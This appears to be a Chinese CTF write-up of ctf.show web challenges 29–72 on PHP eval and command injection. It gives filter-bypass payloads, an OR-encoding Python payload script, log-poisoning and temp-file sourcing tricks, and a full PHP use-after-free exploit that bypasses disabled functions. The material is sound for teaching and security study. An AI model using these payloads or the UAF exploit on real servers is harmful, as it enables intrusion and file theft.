### web29

<img src="https://s2.loli.net/2022/12/23/l7o8SJGUMkHqdpb.png" alt="image-20221223170033041" style="zoom: 33%;" />

分析代码，我们发现可以使用get传参将代码传入，使用c变量接收，然后传入eval()函数中进行代码执行

此处使用正则表达式过滤了flag关键字，我们可以使用通配符绕过

首先使用payload：

```php
?c=system('ls');
```

<img src="https://s2.loli.net/2022/12/23/LGTgM6KQOmfqaED.png" alt="image-20221223171221764" style="zoom:25%;" />

查询到当前目录下存在flag.php,所以我们只需要去访问改文件即可

payload:

```php
?c=system('cat f*');
?c=system('tac f*');
?c=system('tac fla\g.php');    //使用反斜杠转义绕过正则
?c=echo `nl fla''g.php`;    //使用引号干扰正则匹配
...
```

即可得到flag

<img src="https://s2.loli.net/2022/12/23/3tJdeTKc1sYayML.png" alt="image-20221223172027051" style="zoom: 25%;" />



#### eval()函数

<img src="https://s2.loli.net/2022/12/23/NQLMtjE8yo1cPs4.png" alt="image-20221223170257027" style="zoom:33%;" />



### web30

```php
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

过滤了php，system

payload：

```php
?c=echo `cat f*`;
?c=echo `tac fla''g.php`;
?c=echo shell_exec('nl fla?.php');   //shell_exec() 与反引号作用类似
?c=passthru('cat f*');
?c=eval($_GET[1]);&1=system('cat f*');
?c=`mv fla?.p?? 1.txt`;   //将flag.php 重命名为 1.txt 直接访问/1.txt得到flag
?c=`cp fla?.??? 2.txt`;  //将flag.php 复制给 2.txt
...
```

还有一种巧妙地方法

payload:

```php
?c=show_source(next(array_reverse(scandir(current(localeconv())))));
```



#### localeconv()函数

> localeconv() 函数返回一包含本地数字及货币格式信息的**数组**。

<img src="https://s2.loli.net/2022/12/23/whIDnR3yr2zXMZv.png" alt="image-20221223181323711" style="zoom:25%;" />

这个数组的第一个元素就是小数点

于是，我们可以使用 php 中 

#### current()、pos()函数

获取第一个元素的值，即小数点（.）

<img src="https://s2.loli.net/2022/12/23/oyG8zHIOnwvC3Ff.png" alt="image-20221223181508035" style="zoom:33%;" />

然后我们可以使用

#### scandir()函数

> scandir() 函数返回指定目录中的文件和目录的**数组**。

scandir('.') 代表返回当前目录下文件和目录的数组

由于题目中 flag.php  所处数组倒数第二的位置，

我们可以使用 array_reverse() 函数

#### array_reverse() 函数

> ##### 定义和用法
>
> array_reverse() 函数以相反的元素顺序返回数组。
>
> ##### 说明
>
> array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。
>
> 如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。

然后使用 next() 获得第二个位置的元素 flag.php 

接着使用 show_source() 函数将文件进行高亮显示即可：

####  show_source() 函数

> ##### 定义和用法
>
> show_source() 函数对文件进行语法高亮显示。
>
> 本函数是 [highlight_file()](https://www.w3school.com.cn/php/func_misc_highlight_file.asp) 的别名。

因此 payload:

```php
?c=show_source(next(array_reverse(scandir(current(localeconv())))));
```



### web31

```php
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

把空格，单引号等过滤了

空格绕过： $IFS, ${IFS}, $IFS$9, %09



payload:

```php
?c=show_source(next(array_reverse(scandir(current(localeconv())))));
```

```php
?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));
```

> __ FILE __ :被称为PHP魔术常量,返回当前执行PHP脚本的完整路径和文件名,包含一个绝对路径dirname(__ FILE __) 一般会返回文件所的当前目录到系统根目录的一个目录结构。



```php
?c=passthru("tac%09f*");   // 双引号绕过单引号，%09绕过空格
?c=print_r(`nl%09fl[abc]*`);
?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");  
// \x73\x79\x73\x74\x65\x6d 代表了16进制的system
?c=eval($_GET[1]);&1=system('cat f*');
?c=echo%09`strings\${IFS}f*`;     // $必须反斜杠转义  
```

> **strings** 命令是二进制工具集 GNU Binutils  的一员，用于打印文件中可打印字符串，strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。



### web32-36

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

这次又把 反引号 `  , echo , 分号；  小括号 ( 给过滤了

所以，我们需要使用一种不需要括号的语句，我们可以想到包含文件的 include

但是这里把  分号 ;  给过滤了，我们可以使用 ?>  去代替

于是我们可以利用文件包含漏洞

payload：

```php
?c=include%09$_POST[1]?>
post： 1=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

> `php://filter`是`php`中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如`base64`编码处理，`rot13`处理等。

这里就可以将 flag.php 文件base64编码，然后解码就可得到flag·





### web37

```php
 <?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

#### data://

> 数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它**与包含函数结合**时，用户输入的data://流会被**当作php文件执行**。

实例：

```php
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```



于是我们可以使用payload:

```php
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==  
//将 <?php system('cat f*');   进行base64编码
```



### web38

```php
 <?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

可以使用上一题解法，但是过滤了php，可以使用 <?= 代替 <? php

也可以使用**日志文件包含**：

抓包得知该网站为 nginx 中间件，所以日志文件的路径为：

```php
/var/log/nginx/access.log
```

我们将网页抓包：

![image-20221223192438921](https://s2.loli.net/2022/12/23/oEwH24bsU9XWBa1.png)

修改网站的 UA 为：

```php
<?php system('cat f*');?>
```

然后url传参 

```php
?c=/var/log/nginx/access.log
```

这时由于我们的 UA 修改为php脚本了，所以在日志文件中会存在记录，然后再把日志文件包含到当前php文件中，此时日志中存在的php脚本就执行了，我们就查到了flag



### web39

```php
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

我们发现 include中变量后拼接了一个 .php 

但是由于我们使用 data:// 协议，后面的php代码中 ?> 闭合了，导致后面的 .php 没有什么影响

于是，payload:

```php
?c=data://text/plain,<?= system('cat f*');?>
?c=data://text/plain;base64,PD89IHN5c3RlbSgnY2F0IGYqJyk7Pz4=
```



### web40

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
} 
```

这里把中文括号过滤了，并没有过滤英文括号

所以我们可以使用前面的payload：

```php
?c=highlight_file (next(array_reverse(scandir(current(localeconv())))));
```



还有一种方法，我们可以使用它来获取当前目录下文件列表：

```php
?c=session_start();system(session_id());
```

**session_id()函数**

> **session_id()** 返回当前会话ID。   如果当前没有会话，则返回空字符串（`""`）。  

cookie中:

```php
PHPSESSID=ls
```

<img src="https://s2.loli.net/2022/12/23/yAz19K5rSs4EatO.png" alt="image-20221223194755777" style="zoom: 25%;" />





### web41

```php
 <?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?> 
```

这里过滤了数字，字母，异或^，取反~,自增+  	

但是没有过滤或 | ，于是可以通过或 | 构造出我们想要的参数，如 system('ls'); 

原理：使用除了正则之外的字符来使用或运算产生我们想要的字符串

我们可以使用脚本：

```python
import re
import requests

url="http://457b621b-6658-46c5-bf8c-65c0b8066bb6.challenge.ctf.show/"   # 自己修改url

a=[]
ans1=""
ans2=""
for i in range(0,256):
    c=chr(i)
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)   # 正则过滤的参数
    if(tmp):
        continue
        #print(tmp.group(0))
    else:
        a.append(i)

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="cat f*"      #参数
def myfun(k,my):
    global ans1
    global ans2
    for i in range (0,len(a)):
        for j in range(i,len(a)):
            if(a[i]|a[j]==ord(my[k])):
                ans1+=chr(a[i])
                ans2+=chr(a[j])
                return;
for k in range(0,len(mya)):
    myfun(k,mya)
data1="(\""+ans1+"\"|\""+ans2+"\")"
ans1=""
ans2=""
for k in range(0,len(myb)):
    myfun(k,myb)
data2="(\""+ans1+"\"|\""+ans2+"\")"

data={"c":data1+data2}
r=requests.post(url=url,data=data)
print(r.text)
```





### web42

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
```

参考文章：

### [linux中>/dev/null 2>&1和2>&1 > /dev/null](https://www.cnblogs.com/kexianting/p/11630085.html)

看了文章之后，我们大概知道了如下 linux命令的意思

```php
>/dev/null 2>&1
```

大概就是   > 在linux中代表输出重定向（把标准输出重定向到指定的文件或位置）等同于 1>

所以： >/dev/null   

等同于 1>/dev/null ，就是将标准输出重定向到 /dev/null 中，																				/dev/null代表 linux 的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。

所以如果我们使用cat进行查询的话，页面是不会有任何输出的

而， 2>&1 进行了重定向绑定，使用&可以将两个输出绑定在一起，即将错误输出绑定到标准输出的位置，也就是错误输出也写入“黑洞”了。

执行了这条命令之后，**该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中**。

```php
如果
>/dev/null 2>&1
变为：
2>&1 >/dev/null  的话，意思是截然不同的
```

首先 2>&1  将错误输出重定向绑定到标准输出中，此时标准输出为屏幕，所以错误输出在屏幕中，

而 >/dev/null   等同于 1>/dev/null   将标准输出重定向到黑洞。

| 命令            | 标准输出 | 错误输出 |
| --------------- | -------- | -------- |
| >/dev/null 2>&1 | 丢弃     | 丢弃     |
| 2>&1 >/dev/null | 丢弃     | 屏幕     |



综上，我们可以写两条语句即可，前一条给system进行执行，后一条语句被输出到黑洞中了

payload:

```php
?c=cat f*%26%26				// &需要编码为 %26 因为使用的是url传参，&有其他用途
?c=cat f*%26
?c=cat f*%7C%7C 			// | 可以编码为%7C,也可以不编码
?c=cat f*||					
//不能使用一个或 |  因为|会将左边的结果作为右边的输入，这样就会将结果给丢弃(黑洞)
```

也可以使用分号 ;  这样前面的语句与后面就相分隔了

```php
?c=cat f*;
```

还可以使用 %0a 进行换行，命令不在同一行，当然不会进行输出重定向了



### web43

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

禁用了 cat 和 分号;   	可以继续使用上面的姿势

> #### **linux 查看文件内容的方式**
>
> cat：从第一行开始显示文本内容（适用于内容较少的）
>
> tac：从最后一行开始显示，是 cat 的逆顺序
>
> more：一页一页的显示文本内容（适用于内容较多的）
>
> less：与 more 类似，但是比 more 更好的是，它可以往前翻页！
>
> head：只看文本的前面几行
>
> tail：只看文本的后面几行
>
> nl：显示文本内容与行号
>
> od:以二进制的方式读取档案内容
>
> vi:一种编辑器，这个也可以查看
>
> vim:一种编辑器，这个也可以查看
>
> sort:可以查看
>
> uniq:可以查看
>
> file -f:报错出具体内容 
>
> grep
> 1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings



### web44-45

linux中 空格可以使用 ${IFS}  $IFS   $IFS$9 绕过

flag关键字，可以加引号 ''绕过， fla''g  或者使用通配符 f*    fla?.php





### web46

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

把 $ * 数字过滤了

我们就不能使用 ${IFS} 等技巧绕过空格了，我们可以使用 %09（tab，url解码后不算数字）绕过

我们也可以使用 输出重定向 <  将 flag.php 内容读取，绕过了空格



过滤了 * 我们可以使用 ?  如：fla?.php   

我们也可以使用 可以加引号 ''绕过， fla''g  



过滤了cat关键字，我们可以加转义 ca\t  或者加引号  ca''t  

或者 ca$1t   

> **linux shell中$n表示传递给脚本或函数的参数**。n 是一个数字，表示第几个参数。
>  例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。
>  $@表示
>  比如：ca$@t fla$@g
>  ca$1t fla$2g





### web47-51

payload类似



### web52-53

flag换到了根目录下 /flag,

这一题没有过滤 $  可以使用 ${IFS} 绕过空格

ca\t  或  ca''t  绕过过滤



### web54

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

可以使用 linux rev 命令

#### rev

> rev 命令用于将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，以此类推。

payload:

```php
?c=rev${IFS}fla?.php
```



或者，可以直接在根目录下找到cat命令进行查询文件

> cat 命令在linux 的  /bin/cat  路径

payload:

```php
?c=/bin/?at${IFS}fla?.php
```





### [无字母数字webshell总结](https://xz.aliyun.com/t/8107#toc-0)





### web55

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

我们发现这一题过滤了字母，但是没有过滤数字



**方法一**：

我们知道linux有一个base64命令，在  /bin/base64   路径下

于是我们可以构造payload:

```php
?c=/???/????64 ????.???
```

使用通配符去匹配了   /bin/base64  flag.php

从而将 flag.php  网页进行base64编码后打印出来



**方法二**：

有一个bzip2命令，该命令也有数字，命令所处路径： /usr/bin/bzip2

于是构造payload:

```php
?c=/???/???/????2 ????.???
```

该命令会将 flag.php 压缩，成为一个bz2压缩文件

我们只需访问flag.php.bz2将文件下载，查看源代码即可





方法三：

这一题没有过滤 小数点.  

然后linux中 小数点.  相当与source命令，可以执行shell脚本

#### source

> 在当前bash环境下读取并执行fileName中的命令。
>
> *注：该命令通常用命令“.”来替代。
>
> 使用范例：

```shell
source filename 

# 中间有空格
. filename
```



于是，我们可以post上传一个文件，文件中包含了shell命令，到该服务器，上传的时候使用点. 去执行该脚本

一般临时文件在linux中保存在 /tmp/php??????  路径下，后面的6个字符是随机生成的（可以通过通配符匹配）



于是我们可以自己构造一个post上传文件的网页：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form method="post" action="http://10a25f77-7366-42e5-9334-449a03fe2086.challenge.ctf.show/" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="submit">
    </form>
</body>
</html>
```

上传文件到该网页并抓包，修改文件内容为shell脚本格式

并且get传参使用点 . 去执行该文件

<img src="https://s2.loli.net/2022/12/24/YcjiZqfnNKhJxTe.png" alt="image-20221224101228694" style="zoom:33%;" />

get传参：

```php
?c=.+/???/????????[@-[]			
// +代表空格在url中， 最后的[@-[] 是linux下的通配符，去匹配大写字母
//意思就是通过 .(source)  去执行/tmp/php?????? 中我们上传的文件中的shell脚本
```

![img](https://s2.loli.net/2022/12/24/5YGIxtPVQolJKZh.png)



### web56

同上



### web57

```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```

观察题目可知，我们只需要构造出36即可

查阅资料可知：

> linux中
>
> **${_}**=""		//返回上一次的执行结果，如果没有上一次执行结果就返回空
>
> **$(())=0**		
>
> **$(( ~$(()) )) = $((-1)) = -1**
>
> $(()) 是 用来做整数运算的命令，内部可以放表达式，**默认相加**

我们可以通过 $((~-37)) = 36  对-37取反可得36

于是， $(( ~$((  )) )) 在括号内部放入 37个 $(( ~$(()) )) 即-1，默认相加等于 -37 ，再取反得到36



payload:

```php
?c=
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

太牛了这思路





### web58

```php
<?php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

首先我们需要获取flag所在路径：

```php
c=print_r(scandir(dirname(__FILE__)));
c=print_r(scandir(current(localeconv())));

c=$a=opendir('.');while(($file=readdir($a))!=false){echo $file.'<br/>';}
```

#### opendir()

> opendir() 函数打开目录句柄。

#### readdirr()

> readdir() 函数返回目录中下一个文件的文件名。





方法一:

```php
//通过高亮文件去读取文件内容
c=highlight_file('flag.php');
c=highlight_file('flag.php');
```

方法二：

```php
//通过函数去读取文件内容
c=echo file_get_contents('flag.php');   //该函数将文件读入字符串中
c=readfile('flag.php');
c=var_dump(file('flag.php'));
c=print_r(file('flag.php'));
c=var_export(file('flag.php'));
```

#### readfile()

> readfile() 函数读取一个文件，并写入到**输出缓冲**。
>
> 如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。

#### file()

> file() 函数把整个文件**读入一个数组**中。
>
> 数组中的每个元素都是文件中相应的一行，包括换行符在内。

#### var_export()

> **var_export()** 函数用于输出或返回一个变量，以字符串形式表示。
>
> **var_export()** 函数返回关于传递给该函数的变量的结构信息，它和 [var_dump()](https://www.runoob.com/php/php-var_dump-function.html) 类似，不同的是其返回的是一个合法的 PHP 代码。



方法三

```php
通过fopen去读取文件内容，这里介绍下函数
fread()
fgets()
fgetc()
fgetss()
fgetcsv()
gpassthru()
payload:
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

```





### web59

通过 `c=print_r(scandir('.'))` 找到flag.php在当前目录下

readfile() 、file_get_contents()被禁用了

```php
//paylaod汇总
c=highlight_file("flag.php");
c=var_dump(file("flag.php")); 
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);print_r($line);}
c=$a=fopen("flag.php","r");echo fread($a,"1000");
c=$a=fopen("flag.php","r");echo fpassthru($a);
```

#### fpassthru()

> fpassthru() 函数输出文件指针处的所有剩余数据。
>
> 该函数将给定的文件指针从当前的位置读取到 EOF，并把结果写到输出缓冲区。





### web60

payload:

```php
c=highlight_file('flag.php');
c=$a=fopen('flag.php','r');while(!feof($a)){echo fgetc($a);}
c=$a=fopen('flag.php','r');while(!feof($a)){var_dump(fgetcsv($a));}
```

#### fgetcsv

> fgetcsv() 函数从文件指针中读入一行并解析 CSV 字段。
>
> 与 [fgets()](https://www.w3school.com.cn/php/func_filesystem_fgets.asp) 类似，不同的是 fgetcsv() 解析读入的行并找出 CSV 格式的字段，
>
> 返回一个包含这些字段的**数组**。 



解法二：

```php
c=copy('flag.php','flag.txt');		//使用copy函数复制一份内容内txt，直接访问/flag.txt即可
c=rename('flag.php','flag.txt');   //重命名flag.php
```





### web61-65

查找目录payload：

```php
c=$a=opendir('.');while(($file=readdir($a))!==false){echo $file."<br/>";}
c=var_export(scandir('.'));
c=var_export(scandir(dirname(__FILE__)));
c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
```



```php
//payload:
c=show_source('flag.php');
c=highlight_file('flag.php');
c=highlight_file(next(array_reverse(scandir(current(localeconv())))));
```



### web66-67

查找目录:

```php
c=$a=opendir('/');while(($file=readdir($a))!==false){echo $file."<br/>";}
c=var_export(scandir('/'));
```



payload:

```php
c=highlight_file('/flag.txt');
c=include '/flag.txt';  //使用文件包含
c=require('/flag.txt');
```





### web68-70

扫描目录:

```php
c=var_export(scandir('/'));
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```



payload:

```php
c=include '/flag.txt';  //使用文件包含
c=require('/flag.txt');
c=require_once('/flag.txt');
```







### web71

查看源码：

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

我们发现了不认识的函数，查阅资料：

#### ob_get_contents()

> ob_get_contents() — 返回输出缓冲区的内容，或者如果输出缓冲区无效将返回`FALSE` 。
>
> 只是得到输出缓冲区的内容，但不清除它。

#### ob_end_clean()

>  ob_end_clean() — 清空（擦除）缓冲区并关闭输出缓冲 



由上可知，我们通过查询的值会存入缓冲区中，然后$s就是缓冲区的内容，但是最后输出的时候会把内容替换为？。所以我们只需要查询完之后结束后面的代码执行即可将内容显示出来

我们可以使用 **exit()**  **die()**  函数结束接下来的语句执行

```php
//payload
c=include('/flag.txt');exit(0);
c=require('/flag.txt');die();
```





### web72

我们使用

```php
c=var_export(scandir('/'));exit(0);
```

去扫描目录，发现没有权限

但是

```php
c=var_export(scandir('.'));exit(0);
```

可以，于是我们猜测，可能是开启了 open_basedir

####  open_basedir 

> open_basedir可将用户访问文件的活动范围限制在指定的区域,通常是其家目录的路径,
>
> 也 可用符号"."来代表当前目录,注意用open_basedir指定的限制实际上是前缀,而不是目录名.

于是我们需要绕过它，此处禁用了命令执行函数，所以不能这么绕

> **glob**是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，
>
> 它在筛选目录时是不受 open_basedir 的制约的，

所以我们可以利用它来绕过限制，

(需要 url编码 后使用)

```php
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} 
exit(0);
?>
```

读取到 flag 在 /flag0.txt  下

然后使用 UAF 脚本读取flag（不懂）

```php
function pwn($cmd) {
    global $abc, $helper, $backtrace;
 
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { 
 
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
 
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
 
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 
 
    ($helper->b)($cmd);
    exit();
}
 
pwn("cat /flag0.txt");
ob_end_flush();
```

需要进行url编码使用



